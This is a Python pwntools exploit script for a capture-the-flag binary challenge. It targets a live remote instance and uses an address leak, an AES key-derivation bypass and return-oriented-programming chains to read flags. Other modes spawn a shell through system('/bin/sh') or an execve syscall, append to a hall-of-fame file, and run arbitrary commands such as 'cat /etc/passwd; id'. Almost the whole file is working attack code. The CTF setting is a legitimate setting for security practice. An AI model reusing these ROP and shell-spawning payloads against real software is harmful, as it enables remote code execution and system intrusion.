#########################################################################################
# exploit.py
# 2024 by Socialkas, @Disbauxes
# Want more challenges? Go try mine on HTB platform! Still on!
#   https://app.hackthebox.com/challenges/retoretro
#
# Exploit for "porronpwmpwm" challenge by @julianjm
# It solves the challenge and adds some extra options, like gaining a shell without
# leaking any libc6 addresses (see SHELLNOLEAK), appending text to the file "hof.txt"
# without opening a shell and without any libc6 leaks (see HOF) or running any command 
# and retrieving its output (see COMMAND="command arg1 arg2...argN"). For this last
# option we can either use the stack to store our command or use the same technique
# used for args.HOF and args.SHELLNOLEAK (writing to the .bss section) with the
# STACK argument (see examples).
#
# NOTE: The option SHELLNOLEAK, when executed locally, may not work as expected
#       if getpid()+5 does not have the syscall op-code. You can use gdb/r2 in order
#       to see at which offset from getpid "syscall" really is for your local
#       libc6 version and adjust the value accordingly.
#
# Usage:
#   python3 exploit.py [REMOTE] [DEBUG] FLAG1|FLAG2|SHELL|SHELLNOLEAK|HOF|COMMAND="command arg1 arg2...argn" [STACK]
#   
#   Examples:
#       To get flag1 on the live instance (intended way):
#           > python3 exploit.py REMOTE FLAG1
#       To get shell on the live instance (and thus getting flag2 and adding
#           yourself to the Hall Of Fame file - hof.txt- ):
#           > python3 exploit.py REMOTE SHELL
#       To get flag2 without spawning a shell by re-using flag1():
#           > python3 exploit.py REMOTE FLAG2
#       To spwan a shell without leaking any libc6 addresses:
#           > python3 exploit.py REMOTE SHELLNOLEAK
#       To insert a string at the end of "hof.txt" with no libc6 leaks:
#           > python3 exploit.py REMOTE HOF
#       To insert yourself as another player in the hof.txt file:
#          >  python3 exploit.py REMOTE HOF
#           (when asked for a string, type n) your_alias. Example: 6) socialkas!
#       To run "ls -l" on the live instance:
#           > python3 exploit.py REMOTE COMMAND="ls -l"
#       To retrieve both flags at once on the live instance by using COMMAND:
#           > python3 exploit.py REMOTE COMMAND="cat flag*.txt"
#       You can execute a command using the STACK to store it instead of the .bss segment:
#           > python3 exploit.py REMOTE COMMAND="cat /etc/passwd; id" STACK
#########################################################################################
from pwn import *
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad, unpad

# Vulnerable program:
exe = "./reto.e"
binary = ELF(exe)

# Some ROP gadgets we will use to gain our shell.
# Found by running /Rn within an r2 session:
pop_rdi =  0x00252c
pop_rsi =  0x00252e
pop_rax =  0x00252a
pop_ret =  0x00101a
pop_rbp =  0x001353
mov_rbp_rsp =   0x002526

# This address opens "flag1.txt" and reads its contents
# to stdout. We will manipulate rax to point to "flag2.txt" instead
read_flag2 = 0x0000169f

# Program's entry point:
entry0  =  0x001280

# String "flag2.txt\x00":
# [0x000014dd]> f~flag2
# 0x00004228 46 str.La_segunda_flag_est_en_el_fichero_flag2.txt
# [0x000014dd]> ps @ str.La_segunda_flag_est_en_el_fichero_flag2.txt + 36
#   flag2.txt
flag2_str = 0x424c

# Command to be executed using the SHELLNOLEAK technique (see later on):
command =   b'/bin/sh\x00'

# Default fake RBP value
rbp     =   p64(0xdeadbeefcafebabe)

# We control EIP after 272 bytes of padding + RBP returning from flag2():
padding =   b'A'*272

# The offset from our input string and **environ on the stack. We will use this
# to compute where our input string is located if we pass the STACK argument
# to the COMMAND="" option (see later on):
input_offt  =   0x478

#########################################################################################
# aes_encrypt(key,msg)
# Encrypts message "msg" using AES key "key". Takes cares of the padding.
#   RETURNS
#       Encrypted message "enc"
#########################################################################################
def aes_encrypt(key,msg):
    cipher = AES.new(key, AES.MODE_ECB)
    enc = cipher.encrypt(pad(msg,16))
    return enc

#########################################################################################
# aes_decrypt(key,msg)
# Decrypts ciphertext "msg" using AES key "key"
#   RETURNS
#       Decrypted message "dec"
#########################################################################################
def aes_decrypt(key,msg):
    cipher = AES.new(key, AES.MODE_ECB)
    dec = cipher.decrypt(msg)
    return dec

#########################################################################################
#   porron_encrypt(enc_pwd,msg,leak,r)
#       Uses option '3' of the program to encrypt message 'msg'. The AES key is
#       derived from encryption password "enc_pwd". It uses pwntools tube "r".
#       We use this method to bypass the key derivation during the call to
#       sym.flag2() - see later on -
#
#   RETURNS
#           if Leak == True:
#               flag1_leak           : Address of flag1() function
#           else:
#               aes_key              : Derived AES key for flag2()
#########################################################################################
def porron_encrypt(enc_pwd,msg,leak,r):
    # We send option 3:
    r.sendline(b'3')
    # It asks for a "contrase√±a de cifrado", up to 0x20 (32 bytes) to derive
    # the 16-byte AES Key:
    r.recvline()
    r.send(enc_pwd.encode('ascii'))
    # We now get the AES Key:
    r.recvline()
    aes_key = r.recvline()[:-1]
    info("AES Key for '%s': %s " % (enc_pwd.strip(),aes_key.decode('ascii')))

    # We now send our message:
    r.recvline()
    r.send(msg)

    # We grab the encrypted message back:
    r.recvline()
    enc = r.recvline()[:-1]
    info("Encrypted message: %s" % enc.decode('ascii'))

    # We can now decrypt the message to recover the leak, in case Leak == True:
    if leak == True:
        dec = aes_decrypt(bytes.fromhex(aes_key.decode('utf-8')),bytes.fromhex(enc.decode('utf-8')))
        info("Decrypted message: %s" % dec.hex())
        # Because we have overwritten the last byte but this offset never changes,
        # we add it to our leaked address right away (0xdd):
        flag1_leak = int((b'\xdd' + dec[129:134])[::-1].hex(),16)
        return flag1_leak
    else:
        # Otherwise, we return the aes key derived from the encryption password
        # enc_pwd (returned by sym.flag2()):
        return aes_key

#########################################################################################
# grab_aes_key(enc_pwd):
#   Uses option '3' of the program to derive the AES-key from the encryption password
#   enc_pwd. Basically we bypass the AES-key derivation problem (uamkbd2()) by
#   using another instance - in local - to perform this operation for us during the
#   sym.flag2() execution
#
#   RETURNS
#       aes_key :   The AES-key derived from password enc_pwd
#########################################################################################
def grab_aes_key(enc_pwd):
    # We start a new local process first:
    r2 = process(binary.path)
    r2.recvuntil(b': ')
    # We ask for encryption and send it the encryption password:
    aes_key = porron_encrypt(enc_pwd,b'hola',False,r2)
    # We don't need the local process anymore:
    r2.close()
    return aes_key

#########################################################################################
#   update_gadgets_offsets(addr)
#       Updates all the ROP gadgets by adding the binary base address addr
#########################################################################################
def update_gadgets_offsets(addr):

    global pop_rdi
    global pop_rsi
    global pop_rax
    global pop_ret
    global pop_rbp
    global mov_rbp_rsp
    global entry0
    global flag2_str
    global read_flag2

    pop_rdi += addr
    pop_rsi += addr
    pop_rax += addr
    pop_ret += addr
    pop_rbp += addr
    mov_rbp_rsp += addr
    entry0  += addr
    flag2_str += addr
    read_flag2+= addr

#########################################################################################
#   rop_leak_puts(addr)
#       Generates a classic ROP-chain to leak the address of libc6's puts()
#########################################################################################
def rop_leak_puts(addr):

    # We compute puts@plt() and the entry for puts in the got.plt:
    puts_got    =   binary.symbols["got.puts"] + addr
    puts_plt    =   binary.symbols["plt.puts"] + addr

    # We construct and return our simple ROP-chain:
    rop =   b''
    rop +=  p64(pop_rdi)
    rop +=  p64(puts_got)           # rdi <- &got.plt puts
    rop +=  p64(puts_plt)           # puts(&libc6_puts)
    rop +=  p64(entry0)             # back to the entry point!

    return rop

#########################################################################################
# rop_leak_stack(addr,libc6,libc6_base_addr)
#   Generates a ROP-chain that leaks the contents of **environ, so we get a leak
#   for the stack.
#########################################################################################
def rop_leak_stack(addr,libc6,libc6_base_addr):

    puts_plt    =   binary.symbols["plt.puts"] + addr
    # We compute where environ is to leak the stack:
    environ     =   libc6.symbols["environ"] + libc6_base_addr

    warning("environ at 0x%02x" % environ)

    rop_leak_stack   =   b''
    rop_leak_stack   +=  p64(pop_rdi)
    rop_leak_stack   +=  p64(environ)            # rdi <- **environ
    rop_leak_stack   +=  p64(puts_plt)           # puts(&libc6_puts)
    rop_leak_stack   +=  p64(entry0)             # back to the entry point!

    return rop_leak_stack

#########################################################################################
#   rop_shell(system,bin_sh):
#       Generates a classic ROP-chain to gain a shell by running system("/bin/sh\x00")
#########################################################################################
def rop_shell(system,bin_sh):

    rop_shell =     b''
    rop_shell +=    p64(pop_rdi)
    rop_shell +=    p64(bin_sh)         # rdi <- "&bin_sh"
    rop_shell +=    p64(pop_ret)
    rop_shell +=    p64(system)         # system("/bin/sh")

    return rop_shell

#########################################################################################
#   rop_shell_cmd(addr,cmd,waddrofft)
#       Generates a ROP-chain that writes "cmd" at a valid rw- address + offset
#       waddrofft. It uses memset@plt with RDX=1 to write "cmd" byte by byte.
#########################################################################################
def rop_shell_cmd(addr,cmd,waddrofft):

    # We compute the address within the .got.plt for "memset()":
    memset_plt = binary.symbols["plt.memset"] + addr
    warning("memset_plt() at 0x%02x" % memset_plt)

    # We will be writing at the following address:
    #bss_s = addr + 0x60b0 + 0x400 + waddrofft
    bss_s = addr + 0x60b0 + 0x170 + waddrofft
    warning("Writing string %s at 0x%02x" % (cmd,bss_s))

    rop_shell_cmd   =   b''
    # We will write the command byte by byte using memset():
    # At this point, rdx=1, so we will write one byte at a time:
    for i in range(0,len(cmd)):
        rop_shell_cmd    +=  p64(pop_rdi)
        rop_shell_cmd    +=  p64(bss_s + i) # rdi <- &addr
        rop_shell_cmd    +=  p64(pop_rsi)
        rop_shell_cmd    +=  p64(cmd[i])    # rsi <- char
        rop_shell_cmd    +=  p64(memset_plt)# memset(addr,char,1)
    rop_shell_cmd   +=  p64(entry0)         # back to entry point

    # We return the rop-chain and the address where we will write the command:
    return rop_shell_cmd,bss_s

#########################################################################################
#   rop_shell_noleak(addr,offet,cmd_addr)
#       Generates a ROP-chain to execute execve("/bin/sh\x00",NULL,NULL) without
#       leaking any libc6 address.
#########################################################################################
def rop_shell_noleak(addr,offt,cmd_addr):

    # We compute the address within the .got.plt where "getpid()" is:
    getpid_got  = binary.symbols["got.getpid"] + addr
    warning("got.getpid() at 0x%02x" % getpid_got)

    # We know compute the address within the .got.plt for "memset()":
    memset_plt = binary.symbols["plt.memset"] + addr
    warning("memset_plt() at 0x%02x" % memset_plt)

    # We also compute getpid_plt:
    getpid_plt  =   binary.symbols["plt.getpid"] + addr
    warning("getpid_plt() at 0x%02x" % getpid_plt)

    # We know that getpid()+5 has "syscall;ret". This applies to the live
    # instace's libc6 version as well:
    # 0x00007ffff7ea4320 <+0>:	mov    eax,0x27
    # 0x00007ffff7ea4325 <+5>:	syscall
    # 0x00007ffff7ea4327 <+7>:	ret
    # So we can compute now where "syscall" is:
    # For the live instance, syscall is at getpid()+9. We can see that by
    # using r2 and opening libc.so.6 locally.
    if args.REMOTE:
        syscall = offt + 9
    else:
        syscall = offt + 5
    warning("Syscall will be at last byte 0x%02x" % syscall)

    # We compute the .bss segment of the binary:
    bss_s = addr + 0x60b0 + 0x70 + 0x70

    # Now we construct a ROP-chain to overwrite getpid()'s last byte
    # in the .got.plt section with our computed byte for "syscall":
    rop_shell_noleak    =   b''
    # We overwrite getpid@plt last byte for "syscall":
    # memset(&getpid_plt,&getpid_plt, 1):
    rop_shell_noleak    +=  p64(pop_rdi)
    rop_shell_noleak    +=  p64(getpid_got) # rdi <- &getpid_got
    rop_shell_noleak    +=  p64(pop_rsi)
    rop_shell_noleak    +=  p64(syscall)    # rsi <- syscall (byte)
    # At this point, rdx = 1, so we don't need to worry about setting its value!
    rop_shell_noleak    +=  p64(memset_plt) # memset(&getpid_plt,syscall_byte,1)

    # We will take advantage of function fcn.00001b6f() to end up with rdx=0.
    # We need to do this because EDX=1, which would translate into this wrong
    # call to execve: execve(&command,NULL,1). So SEGFAULT due to bad address
    # for the *envp[] third argument (stored in RDX). No ROP-gadgets that pops rdx
    # or edx are found, so we need to improvise.... my favourite part!
    # We set the arguments to the function accordingly to end up with
    # rdx = 0 and avoid the generation of pseudo-random bytes:
    # (We can also set RDX=0 if we call open() XD):
    rop_shell_noleak    +=  p64(pop_rdi)
    rop_shell_noleak    +=  p64(bss_s)
    rop_shell_noleak    +=  p64(pop_rsi)
    rop_shell_noleak    +=  p64(0x1)   # 0x00001d21      4883ea01       sub rdx, 1
    # Now, we make sure rbp == rsp or our ROP-chain will be broken!:
    # mov rbp, rsp; push rax; pop rax; ret;
    rop_shell_noleak    +=  p64(mov_rbp_rsp)
    # This will set rdx = 0 (execve(arg,NULL,NULL /*rdx*/):
    rop_shell_noleak    +=  p64(0x00001d3f + addr)                  # rdx = 0

    # We need to set the rest of execve parameters correctly now. The third one
    # is already fixed: RDX = 0 , char *envp[] = NULL.
    warning("/bin/sh at addr: 0x%02x" % cmd_addr)
    rop_shell_noleak    +=  p64(pop_rdi)
    rop_shell_noleak    +=  p64(cmd_addr)   # rdi <- "/bin/sh\x00"
    rop_shell_noleak    +=  p64(pop_rsi)
    rop_shell_noleak    +=  p64(0x0)        # rsi <- NULL
    rop_shell_noleak    +=  p64(pop_rax)    #
    rop_shell_noleak    +=  p64(0x3b)       # rax <- 0x3b (execve)
    rop_shell_noleak    +=  p64(pop_ret)
    # Finally, here we call execve("sh\x00",NULL,NULL):
    rop_shell_noleak    +=  p64(getpid_plt) # syscall()

    return rop_shell_noleak

#########################################################################################
#   rop_hof_open(addr):
#       Opens "hof.txt" to append data to it (O_WRONLY|O_APPEND)
#########################################################################################
def rop_hof_open(addr):

    # Address for "hof.txt":
    hof_addr    =   0x004340 + addr

    # open@plt:
    open_plt    =   binary.symbols["plt.open"] + addr

    # First thing is to open "hof.txt" in O_APPEND mode so we do not overwrite
    # what is already written to the file:
    rop_hof     =   b''
    rop_hof     +=  p64(pop_rdi)
    rop_hof     +=  p64(hof_addr)       # rdi <- &"hof.txt\x00"
    rop_hof     +=  p64(pop_rsi)
    rop_hof     +=  p64(0x401)          # O_WRONLY|O_APPEND
    rop_hof     +=  p64(open_plt)       # open("hof.txt",O_WRONLY|O_APPEND);

    # After open(), RDX = 0 so we need to fix this. We can get back to
    # entry0, for example, it will set RDX = 1 again.
    rop_hof     +=  p64(entry0)

    return rop_hof

#########################################################################################
#   rop_add_hof(addr,data_addr)
#      Appends byte at data_addr to the file hof.txt
#########################################################################################
def rop_add_hof(addr,data_addr):

    write_plt   =   binary.symbols["plt.write"] + addr

    rop_hof     =   b''
    # RAX holds the new fd, which will be typically 3 (0,1,2 are already
    # in use: stdin, stdout and stderr):
    rop_hof     +=  p64(pop_rdi)
    rop_hof     +=  p64(0x3)            # rdi <- fd

    # write(3,&data_addr,1);
    rop_hof     +=  p64(pop_rsi)
    rop_hof     +=  p64(data_addr)      # rsi <- &byte
    rop_hof     +=  p64(write_plt)      # write(3,&byte,1);
    rop_hof     +=  p64(entry0)         # back to entry0

    return rop_hof

#########################################################################################
#   rop_hof_close(addr)
#       closes "hof.txt"
#########################################################################################
def rop_hof_close(addr):

    close_plt   =   binary.symbols["plt.close"] + addr

    rop_hof     =   b''
    rop_hof     +=  p64(pop_rdi)
    rop_hof     +=  p64(0x3)
    rop_hof     +=  p64(close_plt)

    return rop_hof

#########################################################################################
#   rop_flag2_read(addr)
#       Generates a ROP-chain to re-use flag1() in order to read file "flag2.txt"
#       For this, we only need a leak from the program's text segment.
#########################################################################################
def rop_flag2_read(addr):

    # We compute the .bss segment of the binary:
    bss_s = addr + 0x60c0
    warning("Binary .bss segment rw- at 0x%02x" % bss_s)

    # The program uses rbp-0xa0, rbp-0x18 and rbp-0x10, so we compensate:
    writable = bss_s + 0x100
    warning("We will use 0x%02x as stack" % writable)
    info("flag2.txt at 0x%2x" % flag2_str)
    info("read_flag at 0x%2x" % read_flag2)

    rop_readFlag2   =   b''
    rop_readFlag2   +=  p64(pop_rax)
    rop_readFlag2   +=  p64(flag2_str)  # rax <- &"flag2.txt"
    rop_readFlag2   +=  p64(pop_rsi)
    rop_readFlag2   +=  p64(0x0)        # rsi <- 0x0
    # We fix rbp so it points to a valid rw- section:
    rop_readFlag2   +=  p64(pop_rbp)    
    rop_readFlag2   +=  p64(writable)   # rbp <- &writable
    rop_readFlag2   +=  p64(read_flag2) # flag1()

    return rop_readFlag2

#########################################################################################
#   flag2_send_payload(payload,rbp,r)
#       Encrypts and sends payload PAYLOAD to the vulnerable program. Sets RBP to
#       the value "rbp".
#########################################################################################
def flag2_send_payload(payload,rbp,r,prepad=b''):

    # We add the padding + RBP before our payload. If we have a valid prepad,
    # we add it BEFORE the actual padding. With this, we can use the stack to
    # write anything we want to be executed in our buffer:
    msg = prepad + padding[0:len(padding)-len(prepad)] + rbp + payload + b'\x0a'
    if(len(prepad)>0):
        info("Payload with prepad: %s" % msg)

    # We ask for option '2' now and we recover the encryption password:
    r.sendline(b'2')
    r.recvuntil(b'usar:')

    # We grab the encryption password returned by the program:
    enc_pwd = r.recvline().decode('ascii').strip()
    info("Encryption password: %s " % enc_pwd)

    # Now, we start a local process to retrieve the AES derived key:
    aes_key = grab_aes_key(enc_pwd)
    info("Derived AES-Key is: %s " % aes_key.decode('ascii'))

    # Now we can encrypt our payload and bypass the AES Key derivation routine:
    enc_payload = aes_encrypt(bytes.fromhex(aes_key.decode('ascii')),msg)

    r.recvuntil(b'cifrado:\n')
    info("Sending encrypted payload: %s " % enc_payload.hex())
    r.send(enc_payload)
    r.recvuntil(b"Suerte!\n")

#########################################################################################
# binary_leak(r)
#   Returns the binary base address by exploiting the vulnerability in encrypt() that
#   leaks the address of flag1().
#########################################################################################
def binary_leak(r):

    # We get the leak:
    flag1_addr = porron_encrypt('PEPE\n',b'A'*126 + b'\0xa',True,r) 
    warning("Flag1() address leaked! 0x%02x" % flag1_addr)

    # We can compute the binary base address now:
    binary_base_addr = flag1_addr - binary.symbols['flag1']
    warning("Binary base address: 0x%02x" % binary_base_addr)

    # We can update all the offsets of our ROP gadgets now:
    update_gadgets_offsets(binary_base_addr)

    # We return the binary base address:
    return binary_base_addr

# We run a local process or we connect to the live instance?
if args.REMOTE:
    r = remote('167.235.132.30',2312)
else:
    r = process(binary.path)

# We get the main menu:
r.recvuntil(b': ')

#########################################################################################
# Flag1: easy.
#   We can set our input number to 0x539 (1337) to reach the "decryption" path
#   and overwrite the address of the variable (in the stack) where the pseudo random
#   number is stored with our input value (0x539)
#########################################################################################
if args.FLAG1:

    info("Retrieving flag1 by overwritting [rbp-14h] (intended way)")

    # We ask for option '1': flag1
    r.sendline(b'1')
    # We send 1337 to force the control path of AES decryption:
    r.sendlineafter(b'mero: ',b'1337')
    aes_key = r.recvline().decode('ascii').split(':')[1].strip()
    info("AES key: %s " % aes_key)

    # Now that we have the random 16-byte AES generated key,
    # we can encrypt a message. Our payload will be: padding (140 bytes)
    # + our inputted number 0x00000539 and the new line character:
    msg = b"A"*140 + b'\x39\x05\x00\x00' + b'\n'

    # We encrypt our payload:
    enc = aes_encrypt(bytes.fromhex(aes_key),msg)
    info("Sending encrypted payload: %s " % enc.hex())
    r.recvline()
    # We send our payload now:
    r.send(enc)

    # And the binary opens "flag1.txt" and returns it:
    flag1 = r.recvuntil(b'}').decode('utf-8').split('\n')[3]
    warning("Flag1: %s " % flag1)
    sys.exit(0)

#########################################################################################
#   FLAG2
#       Re-uses flag1() by manipulating some registers and changing "flag1.txt"
#       with "flag2.txt" to read the flag. Does not spawn a shell.
#########################################################################################
if args.FLAG2:

    info("Retrieving flag2.txt without spawning a SHELL by re-using flag1()")

    # We retrieve the binary base address first:
    binary_base_addr = binary_leak(r)

    # We can construct now a simple ROP gadget to read flag2.txt
    # by taking advantatge of function "flag1()":
    flag2_send_payload(rop_flag2_read(binary_base_addr),rbp,r)

    # We retrieve the contents of flag2.txt:
    flag2 = r.readuntil(b'}').decode('ascii')
    warning("Flag2: %s " % flag2)
    sys.exit(0)

#########################################################################################
# Unintended way: SHELL
#   Please notice that the binary has partial RelRo, so it is also posible to
#   gain a remote shell by overwriting any function in .got.plt section and then
#   calling that function! We do not do that here; we construct a classic ROP-chain.
#########################################################################################
if args.SHELL:

    info("Spawning a shell")

    # We retrieve the binary base address first:
    binary_base_addr = binary_leak(r)

    # We are going to leak libc6's puts():
    flag2_send_payload(rop_leak_puts(binary_base_addr),rbp,r)

    # Now we get the leak:
    puts_leak = int(r.recv(6)[::-1].hex(),16)
    warning("puts() in libc6 leaked! 0x%02x" % puts_leak)

    # If we are running against the live instance:
    # We know which version of libc6 the live instance is using because:
    # readelf -p .comment reto.e
    # [     0]  GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0
    # https://packages.ubuntu.com/jammy/amd64/libc6/download
    if args.REMOTE:
        libc6 = ELF("libc/lib/x86_64-linux-gnu/libc.so.6")
    else:
        libc6 = ELF("/lib/x86_64-linux-gnu/libc.so.6")

    # We can now compute libc6 base address:
    libc6_base_addr = puts_leak - libc6.symbols["puts"]
    info("Libc6 base address is: 0x%02x" % libc6_base_addr)       
        
    # We compute system:
    system = libc6_base_addr + libc6.symbols["system"]
    info("System is at : 0x%02x" % system)

    # We compute the address for "/bin/sh" now:
    bin_sh = next(libc6.search(b'/bin/sh')) + libc6_base_addr
    info("/bin/sh at 0x%02x" % bin_sh)

    # We can construct now our rop-shell:
    flag2_send_payload(rop_shell(system,bin_sh),rbp,r)
    # We gain our shell:
    r.interactive()

    sys.exit(0)

#########################################################################################
#   Shell with no libc6 leaks.
#       This attack is based on the observation that getpid()+offset has the opcode
#       "syscall". Typically, the offset is a bunch of bytes away. For example, on the
#       live instance is 9. Knowning the server's libc6 version allows us to find this
#       offset. Worst case scenario, this script can be executed multiple times by
#       increasing the offset bye by byte until reaching "syscall" and gaining a shell or
#       by dumping bytes starting at offset &getpid@got until reaching the bytes 0f05.
# 
#       So we overwrite the last byte for getpid@got with the pre-computed offset
#       value, then we use a ROP-chain attack to set RDX=0 by taking advantatge of
#       function  fcn.00001b6f and we call syscall() with eax = 0x3b (execve()). 
#       Because we do not want leaks, we need to write the command "/bin/sh" into a rw- 
#       segment first, so we use memset() for that and the .bss section.
#########################################################################################
if args.SHELLNOLEAK:

    # Local instance or remote:
    if args.REMOTE:
        libc6 = ELF("libc/lib/x86_64-linux-gnu/libc.so.6")
    else:
        libc6 = ELF("/lib/x86_64-linux-gnu/libc.so.6")

    info("Spawning a shell without leaking any libc6 addresses!")

    # We grab the last byte for the offset of getpid():
    offset = libc6.symbols["getpid"] & 0xff
    info("Offset byte for getpid(): 0x%02x" % offset)

    # We retrieve the binary base address first:
    binary_base_addr = binary_leak(r)

    # We need to write our command first to a valid rw- memory segment
    # as our first attack. We could increase the bytes read using a 
    # 2nd stage kind of payload, but we can also write the command in three
    # parts: "/bi", "n/s" and finally "h\x00":
    off = 0
    for i in range(0,3):
        cmd = command[i*3:4*i+3]
        info("Writing string: %s " % cmd)
        rop_write_cmd,cmd_addr   =   rop_shell_cmd(binary_base_addr,cmd,off)
        flag2_send_payload(rop_write_cmd,rbp,r)
        off+=3

    # Now we construct our ROP attack to call system without leaking
    # any libc6's addresses! We need to solve RDX=0, see later on:
    flag2_send_payload(rop_shell_noleak(binary_base_addr,offset,cmd_addr-(len(command)-2)),rbp,r)
    r.interactive()

    sys.exit(0)

#########################################################################################
#   Appends text to the "hof.txt" file. The current contents of hof.txt are preserved
#   because the file is opened as O_WRONLY|O_APPEND. We can add anything we want to the
#   file without leaking any libc6 addresses, as with "SHELLNOLEAK". It's the same
#   technique, only using the calls in @plt and the .bss segment. Of course, if we
#   assume we want to leak libc6, then we could use the STACK to store our input
#   string, instead of the .bss section and calling memset() iteratively (see
#   args.COMMAND with the args.STACK parameter later on):
#########################################################################################
if args.HOF:
    
    # First, we grab the string to add to the file:
    data = raw_input("String to add to hof.txt? ")
    if data == b'\n':
        error("Please, type a valid string")
    info("Appending string: %s to hof.txt!" % data.strip())

    # We retrieve the binary base address first:
    binary_base_addr = binary_leak(r)

    # Now, we will write the string in chunks of 3 bytes each into a valid
    # rw- segment (.bss):
    off = 0
    # We make sure our input string can be divided into chunks of 3 bytes
    # each by padding (first, we remove \n):
    while len(data) % 3 != 0:
            data+=b'\x00'
    for i in range(0,int(len(data)/3)):
        chunk = data[i*3:(i*3)+3]
        info("Writing string: %s " % chunk)
        rop_write_cmd,cmd_addr   =   rop_shell_cmd(binary_base_addr,chunk,off)
        flag2_send_payload(rop_write_cmd,rbp,r)
        off+=3

    # The offset of our string in the .bss segment:
    data_addr   =   cmd_addr - (len(data)-3)
    info("String address is : 0x%02x" % data_addr)

    # We open "hof.txt" once. We need to do this step by step because after
    # calling open(), RDX=0 and we need at least RDX=1 to write something into
    # hof.txt! Because we do not have any ROP gadget that allows us to control
    # RDX/EDX, we need at least to content ourselves with RDX=1 ;-)
    # Accidentally, now that we know that after calling open(), RDX=0, we can
    # probably simplify the ROP-chain "rop_shell_noleak" in order to gain a
    # shell without leaking any libc6 address (see rop_shell_noleak() function).
    flag2_send_payload(rop_hof_open(binary_base_addr),rbp,r)

    # Now we have RDX=1 again, we write byte by byte to the file thanks to
    # memset@plt. It's the same idea as the one used to copy our data into
    # the .bss segment: byte by byte.
    info("Writing string byte by byte into hof.txt")
    for i in range(data_addr,cmd_addr+2):
        flag2_send_payload(rop_add_hof(binary_base_addr,i),rbp,r)

    # And we finally close the file by calling close(3):
    flag2_send_payload(rop_hof_close(binary_base_addr),rbp,r)

#########################################################################################
#   COMMAND:    Runs command "COMMAND" using system().
#   Stores COMMAND in the .bss section by using memset(), as described earlier or
#   stores the command on the stack if STACK is used.
#########################################################################################
if args.COMMAND:
    
    # We get the command to run first:
    data  =   args.COMMAND.encode('ascii')
    if data == 'True':
        error("Please, specify a valid command!")
    
    # When "STACK" is used, we can write up to 29 bytes for a valid command before
    # the contents of the stack are overwritten:
    if args.STACK and len(data)>27:
        error("When using STACK, the length of the command must be up to 27 bytes long!")

    info("Running command: %s, len=%d " % (data,len(data)))

    # We retrieve the binary base address first:
    binary_base_addr = binary_leak(r)

    # Our fake value for RBP (later on, we will overwrite it with a valid rw- segment)
    flag2_send_payload(rop_leak_puts(binary_base_addr),rbp,r)

    # Now we get the leak:
    puts_leak = int(r.recv(6)[::-1].hex(),16)
    warning("puts() in libc6 leaked! 0x%02x" % puts_leak)

    # If we are running against the live instance:
    # We know which version of libc6 the live instance is using because:
    # readelf -p .comment reto.e
    # [     0]  GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0
    # https://packages.ubuntu.com/jammy/amd64/libc6/download
    if args.REMOTE:
        libc6 = ELF("libc/lib/x86_64-linux-gnu/libc.so.6")
    else:
        libc6 = ELF("/lib/x86_64-linux-gnu/libc.so.6")

    # We can now compute libc6 base address:
    libc6_base_addr = puts_leak - libc6.symbols["puts"]
    info("Libc6 base address is: 0x%02x" % libc6_base_addr)       
        
    # We compute system:
    system = libc6_base_addr + libc6.symbols["system"]
    info("System is at : 0x%02x" % system)


    # If we don't care about leaking libc6 addresses, it's easy to leak the address
    # of the stack thanks to the **environ variable. Instead of using the usual padding,
    # we will prepad our input command right away. We need to add a \x00 at the end of it first:
    args.COMMAND += '\x00'
    if args.STACK:
        flag2_send_payload(rop_leak_stack(binary_base_addr,libc6,libc6_base_addr),rbp,r,args.COMMAND.encode('ascii'))
        # Now we get the leak:
        stack_leak = int(r.recv(6)[::-1].hex(),16)
        warning("Stack address leaked! 0x%02x" % stack_leak)
        # We can compute where our buffer is located within the binary:
        data_addr  =   stack_leak - input_offt
    else:
        # Instead of using the stack, we can use the same technique shown earlier
        # (see args.SHELLNOLEAK) to write our command into the .bss section by
        # using memset() iteratively.
        off = 0
        # We make sure our input string can be divided into chunks of 3 bytes
        # each by padding (first, we remove \n):
        while len(data) % 3 != 0:
            data+=b'\x00'
        for i in range(0,int(len(data)/3)):
            chunk = data[i*3:(i*3)+3]
            info("Writing string: %s " % chunk)
            rop_write_cmd,cmd_addr   =   rop_shell_cmd(binary_base_addr,chunk,off)
            flag2_send_payload(rop_write_cmd,rbp,r)
            off+=3

        # The offset of our string in the .bss segment:
        data_addr   =   cmd_addr - (len(data)-3)
    
    info("String address is : 0x%02x" % data_addr)

    # We know construct a classic rop-gadget to run system(command)
    flag2_send_payload(rop_shell(system,data_addr),rbp,r)
    
    # We get the output from the remote command (non-interactive):
    info("Retrieving command output now...")
    warning(r.recvall().decode('utf-8'))
    sys.exit(0)
